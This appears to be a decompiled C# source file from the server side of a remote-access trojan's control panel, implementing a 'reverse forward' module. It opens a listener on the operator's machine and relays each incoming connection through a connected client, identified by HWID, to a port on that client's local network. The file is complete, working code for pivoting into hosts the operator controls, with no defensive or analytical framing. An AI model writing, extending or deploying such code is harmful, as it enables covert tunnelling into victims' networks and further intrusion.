using System;
using System.Collections.Generic;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Leb128;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerReverseForward
{
	private static Dictionary<string, Dictionary<int, TcpClient>> clientConnections = new Dictionary<string, Dictionary<int, TcpClient>>();

	private static Dictionary<string, TcpListener> serverListeners = new Dictionary<string, TcpListener>();

	private static Dictionary<string, int> localPorts = new Dictionary<string, int>();

	private static int nextConnectionId = 1;

	public static void Read(Clients client, object[] array)
	{
		if (client == null || array == null || array.Length < 2)
		{
			client?.Disconnect();
			return;
		}
		try
		{
			string command = (string)array[1];
			string hwid = client.Hwid;
			switch (command)
			{
			case "Started":
			{
				int serverPort = (int)array[2];
				int localPort = (int)array[3];
				FormReverseForward form2 = (FormReverseForward)Application.OpenForms["ReverseForward:" + hwid];
				if (form2 != null)
				{
					form2.Invoke((MethodInvoker)delegate
					{
						form2.UpdateStatus("Forward started on port " + serverPort);
					});
				}
				Methods.AppendLogs(client.IP, "Reverse Forward started on port " + serverPort, Color.Green);
				localPorts[hwid] = localPort;
				if (serverListeners.ContainsKey(hwid))
				{
					break;
				}
				try
				{
					TcpListener listener = new TcpListener(IPAddress.Any, serverPort);
					listener.Start();
					serverListeners[hwid] = listener;
					Thread thread = new Thread((ThreadStart)delegate
					{
						AcceptConnections(client, hwid, listener);
					});
					thread.IsBackground = true;
					thread.Start();
					break;
				}
				catch (Exception ex)
				{
					Methods.AppendLogs(client.IP, "Failed to start server listener: " + ex.Message, Color.Red);
					break;
				}
			}
			case "Stopped":
			{
				FormReverseForward form3 = (FormReverseForward)Application.OpenForms["ReverseForward:" + hwid];
				if (form3 != null)
				{
					form3.Invoke((MethodInvoker)delegate
					{
						form3.UpdateStatus("Forward stopped");
					});
				}
				Methods.AppendLogs(client.IP, "Reverse Forward stopped", Color.Orange);
				if (serverListeners.ContainsKey(hwid))
				{
					try
					{
						serverListeners[hwid].Stop();
						serverListeners.Remove(hwid);
					}
					catch
					{
					}
				}
				if (localPorts.ContainsKey(hwid))
				{
					localPorts.Remove(hwid);
				}
				if (!clientConnections.ContainsKey(hwid))
				{
					break;
				}
				foreach (TcpClient conn in clientConnections[hwid].Values)
				{
					try
					{
						conn.Close();
					}
					catch
					{
					}
				}
				clientConnections.Remove(hwid);
				break;
			}
			case "Data":
			{
				int connectionId2 = (int)array[2];
				byte[] data = (byte[])array[3];
				if (clientConnections.ContainsKey(hwid) && clientConnections[hwid].ContainsKey(connectionId2))
				{
					try
					{
						clientConnections[hwid][connectionId2].GetStream().Write(data, 0, data.Length);
						break;
					}
					catch (Exception ex2)
					{
						Methods.AppendLogs(client.IP, "Error forwarding data: " + ex2.Message, Color.Red);
						CloseConnection(client, hwid, connectionId2);
						break;
					}
				}
				break;
			}
			case "Disconnect":
			{
				int connectionId = (int)array[2];
				CloseConnection(client, hwid, connectionId);
				break;
			}
			case "Error":
			{
				string errorMsg = (string)array[2];
				Methods.AppendLogs(client.IP, "Reverse Forward Error: " + errorMsg, Color.Red);
				FormReverseForward form = (FormReverseForward)Application.OpenForms["ReverseForward:" + hwid];
				if (form != null)
				{
					form.Invoke((MethodInvoker)delegate
					{
						form.UpdateStatus("Error: " + errorMsg);
					});
				}
				break;
			}
			}
		}
		catch (Exception ex3)
		{
			Methods.AppendLogs(client.IP, "HandlerReverseForward error: " + ex3.Message, Color.Red);
		}
	}

	private static void AcceptConnections(Clients client, string hwid, TcpListener listener)
	{
		while (listener != null && serverListeners.ContainsKey(hwid))
		{
			try
			{
				TcpClient serverClient = listener.AcceptTcpClient();
				int connectionId = Interlocked.Increment(ref nextConnectionId);
				if (!clientConnections.ContainsKey(hwid))
				{
					clientConnections[hwid] = new Dictionary<int, TcpClient>();
				}
				clientConnections[hwid][connectionId] = serverClient;
				Thread thread = new Thread((ThreadStart)delegate
				{
					ReadFromServerConnection(client, hwid, connectionId, serverClient);
				});
				thread.IsBackground = true;
				thread.Start();
				if (localPorts.ContainsKey(hwid))
				{
					int localPort = localPorts[hwid];
					client.Send(LEB128.Write(new object[4] { "ReverseForward", "NewConnection", connectionId, localPort }));
					Methods.AppendLogs(client.IP, "New server connection: " + connectionId + " -> client local port " + localPort, Color.Blue);
				}
			}
			catch
			{
				if (!serverListeners.ContainsKey(hwid))
				{
					break;
				}
			}
		}
	}

	private static void ReadFromServerConnection(Clients client, string hwid, int connectionId, TcpClient tcpClient)
	{
		byte[] buffer = new byte[8192];
		NetworkStream stream = null;
		try
		{
			stream = tcpClient.GetStream();
			while (tcpClient.Connected && client.itsConnect)
			{
				int bytesRead = stream.Read(buffer, 0, buffer.Length);
				if (bytesRead > 0)
				{
					byte[] data = new byte[bytesRead];
					Array.Copy(buffer, data, bytesRead);
					client.Send(LEB128.Write(new object[4] { "ReverseForward", "Data", connectionId, data }));
					continue;
				}
				break;
			}
		}
		catch
		{
		}
		finally
		{
			CloseConnection(client, hwid, connectionId);
			client.Send(LEB128.Write(new object[3] { "ReverseForward", "Disconnect", connectionId }));
		}
	}

	private static void CloseConnection(Clients client, string hwid, int connectionId)
	{
		try
		{
			if (clientConnections.ContainsKey(hwid) && clientConnections[hwid].ContainsKey(connectionId))
			{
				clientConnections[hwid][connectionId].Close();
				clientConnections[hwid].Remove(connectionId);
			}
		}
		catch
		{
		}
	}
}
